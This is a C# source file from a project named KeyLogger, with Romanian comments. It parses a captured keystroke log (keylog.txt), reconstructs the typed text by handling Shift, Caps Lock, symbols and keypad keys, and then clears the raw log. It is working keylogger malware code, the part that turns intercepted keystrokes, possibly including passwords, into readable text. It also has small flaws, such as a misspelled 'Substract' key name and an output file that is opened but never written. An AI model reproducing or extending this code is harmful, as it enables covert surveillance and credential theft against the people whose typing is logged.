/*
    In aceasta parte am facut filtrarea inputurilor de la tastatura pe baza Windows key api apelate de catre ProcessMonitor (parte integrata de Adrian si mine)
    Initial se cauta keylog.txt, dupa care se atribuie tot inputul unei variabile lines
    Am luat in calcul daca utilizatorul apasa Shift + 1/2/3/... sau Control + litera sau Control + Shift + litera 
    Am integrat si functionalitatile keypadului din dreapta a tastaturii cu tot cu /-*+ si Enter (Return)
    Am descoperit faptul ca unele PC-uri interpreteaza Enterul ca si Return
 */

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace KeyLogger
{
    public class FiltruLogs
    {
        private string Path2txt;

        public FiltruLogs()
        {
            Path2txt = GetLogPath(); // se initiaza path2txt;
        }

        private static string GetLogPath()
        {
            string executablePath = AppDomain.CurrentDomain.BaseDirectory; //se cauta in folderul base pt 
            string PathRelativ = Path.Combine(executablePath, @"keylog.txt"); //pe baza la folderul base se cauta "keylog.txt
            return PathRelativ;
        }

        public string Filtrare_Text()
        {
            if (!File.Exists(Path2txt))
            {
                Console.WriteLine("Nu exista keylog.txt");
                return "";
            }

            string[] lines = File.ReadAllLines(Path2txt); //citesc tot din keylog si bag in lines

            StringBuilder cuvant = new StringBuilder(); //ce urmeaza sa fie scris in filtru.txt

            bool shft = false;
            int caps = 0;

            using (StreamWriter writer = new StreamWriter("filtrat.txt"))
            {
                foreach (string line in lines)
                {
                    int indexLitera = line.IndexOf("Key") + 5; // +5 ca sa sar peste "Key: "

                    if (indexLitera < 5 || indexLitera >= line.Length) continue;

                    if (line.Contains("LShiftKey") || line.Contains("RShiftKey") || line.Contains("Shift"))
                        {
                            shft = true; // cand se apasa oricare din shifutri -> urmatoarea litera o sa fie mare (daca nu e caps)
                            continue;
                        }

                        if (line.Contains("Capital"))
                        {
                            caps ^= 1; // cand se apasa iar caps -> se inverseaza val la caps
                            continue;
                        }

                        if (shft == false)
                        {

                            if (line[indexLitera] == 'D' && line[indexLitera + 1] >= '0' && line[indexLitera + 1] <= '9')
                            {
                                cuvant.Append(line[indexLitera + 1]);
                                continue;
                            }

                            if (caps == 0)
                            {
                                if (line[indexLitera + 1] == ' ')
                                {
                                    //writer.WriteLine(line[indexLitera]);
                                    cuvant.Append(char.ToLower(line[indexLitera]));// fara shift anterior -> litera mica
                                    continue;
                                }
                            }
                            else
                            {
                                if (line[indexLitera + 1] == ' ')
                                {
                                    //writer.WriteLine(line[indexLitera]);
                                    cuvant.Append((line[indexLitera]));// -> daca e apasat caps -> litera mare 
                                    continue;
                                }
                            }

                            switch (line)
                            {
                                case string s when s.Contains("Space"):
                                    cuvant.Append(' ');
                                    break;

                                case string s when s.Contains("Oemcomma"):
                                    cuvant.Append(',');
                                    break;

                                case string s when s.Contains("OemPeriod"):
                                    cuvant.Append('.');
                                    break;


                                case string s when s.Contains("Oem1"):
                                    cuvant.Append(';');
                                    break;

                                case string s when s.Contains("OemOpenBrackets"):
                                    cuvant.Append('[');
                                    break;

                                case string s when s.Contains("Oem6"):
                                    cuvant.Append(']');
                                    break;

                                case string s when s.Contains("OemMinus"):
                                    cuvant.Append('-');
                                    break;

                                case string s when s.Contains("OemPlus"):
                                    cuvant.Append('=');
                                    break;

                                case string s when s.Contains("OemQuestion"):
                                    cuvant.Append('/');
                                    break;

                                case string s when s.Contains("Oem5"):
                                    cuvant.Append('\\');
                                    break;

                                case string s when s.Contains("Oemtilde"):
                                    cuvant.Append('`');
                                    break;

                                case string s when s.Contains("Oem7"):
                                    cuvant.Append('\'');
                                    break;


                                case string s when s.Contains("Divide"):
                                    cuvant.Append('/');
                                    break;

                                case string s when s.Contains("Multiply"):
                                    cuvant.Append('*');
                                    break;

                                case string s when s.Contains("Substract"):
                                    cuvant.Append('-');
                                    break;

                                case string s when s.Contains("Add"):
                                    cuvant.Append('+');
                                    break;

                                default:
                                    break;
                            }
                        }

                        if (shft == true)
                        {
                            shft = false; // pt ca nu stiu cat timp e apasat shift de la loguir -> doar urmatoarea litera e mare

                            if (line[indexLitera] == 'D' && line[indexLitera + 1] >= '0' && line[indexLitera + 1] <= '9')
                            {
                                //cuvant.Append(line[indexLitera + 1]);
                                switch (line[indexLitera + 1])
                                {
                                    case char s when s == '1':
                                        cuvant.Append('!');
                                        break;

                                    case char s when s == '2':
                                        cuvant.Append('@');
                                        break;

                                    case char s when s == '3':
                                        cuvant.Append('#');
                                        break;

                                    case char s when s == '4':
                                        cuvant.Append('$');
                                        break;

                                    case char s when s == '5':
                                        cuvant.Append('%');
                                        break;

                                    case char s when s == '6':
                                        cuvant.Append('^');
                                        break;

                                    case char s when s == '7':
                                        cuvant.Append('&');
                                        break;

                                    case char s when s == '8':
                                        cuvant.Append('*');
                                        break;

                                    case char s when s == '9':
                                        cuvant.Append('(');
                                        break;

                                    case char s when s == '0':
                                        cuvant.Append(')');
                                        break;

                                    default: break;

                                }
                            }

                            if (caps == 0)
                            {
                                if (line[indexLitera + 1] == ' ')
                                {
                                    //writer.WriteLine(line[indexLitera]);
                                    cuvant.Append((line[indexLitera])); // fara caps cu shift anterior -> litera mare
                                    continue;
                                }
                            }
                            else
                            {
                                if (line[indexLitera + 1] == ' ')
                                {
                                    //writer.WriteLine(line[indexLitera]);
                                    cuvant.Append(char.ToLower(line[indexLitera])); // cu caps si cu shift anterior -> litera mica 
                                    continue;
                                }
                            }

                            switch (line)
                            {
                                case string s when s.Contains("Space"):
                                    cuvant.Append(' ');
                                    break;

                                case string s when s.Contains("Oemcomma"):
                                    cuvant.Append('<');
                                    break;

                                case string s when s.Contains("OemPeriod"):
                                    cuvant.Append('>');
                                    break;


                                case string s when s.Contains("Oem1"):
                                    cuvant.Append(':');
                                    break;

                                case string s when s.Contains("OemOpenBrackets"):
                                    cuvant.Append('{');
                                    break;

                                case string s when s.Contains("Oem6"):
                                    cuvant.Append('}');
                                    break;

                                case string s when s.Contains("OemMinus"):
                                    cuvant.Append('_');
                                    break;

                                case string s when s.Contains("OemPlus"):
                                    cuvant.Append('+');
                                    break;

                                case string s when s.Contains("OemQuestion"):
                                    cuvant.Append('?');
                                    break;

                                case string s when s.Contains("Oem5"):
                                    cuvant.Append('|');
                                    break;

                                case string s when s.Contains("Oemtilde"):
                                    cuvant.Append('~');
                                    break;

                                case string s when s.Contains("Oem7"):
                                    cuvant.Append('\"');
                                    break;


                                case string s when s.Contains("Divide"):
                                    cuvant.Append('/');
                                    break;

                                case string s when s.Contains("Multiply"):
                                    cuvant.Append('*');
                                    break;

                                case string s when s.Contains("Substract"):
                                    cuvant.Append('-');
                                    break;

                                case string s when s.Contains("Add"):
                                    cuvant.Append('+');
                                    break;

                                default:
                                    break;
                            }
                        }
                    //}
                }
            }
            File.WriteAllText("keylog.txt", string.Empty);
            return cuvant.ToString();
        }
    }
}
